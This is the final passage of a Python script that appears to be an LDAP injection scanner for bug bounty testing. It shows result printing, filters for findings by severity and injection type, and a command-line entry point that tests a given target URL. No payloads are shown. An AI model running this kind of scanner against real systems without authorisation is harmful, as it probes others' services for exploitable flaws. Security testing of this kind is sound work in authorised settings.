                        print(f"    Payload: {f.payload[:60]}{'...' if len(f.payload) > 60 else ''}")
                        print(f"    Bounty: {f.bounty_estimate}")

        print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")

    def get_findings(self) -> List[LDAPFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: Severity) -> List[LDAPFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_findings_by_type(self, injection_type: InjectionType) -> List[LDAPFinding]:
        """Get findings by injection type."""
        return [f for f in self.findings if f.injection_type == injection_type]


async def main():
    """CLI interface."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python ldap_injection_tester.py <target_url> [target_identifier]")
        print("Example: python ldap_injection_tester.py https://example.com/api/login example.com")
        sys.exit(1)

    target_url = sys.argv[1]
    target = sys.argv[2] if len(sys.argv) > 2 else None

    tester = LDAPInjectionTester(target_url=target_url, target=target)
    findings = await tester.test_all()

    print(f"\n{Fore.CYAN}=== FINAL RESULTS ==={Style.RESET_ALL}")
    print(f"Total findings: {len(findings)}")

    if findings:
        print(f"\n{Fore.RED}[!] LDAP injection vulnerabilities detected!{Style.RESET_ALL}")
        print(f"Review findings and validate manually.")


if __name__ == "__main__":
    asyncio.run(main())
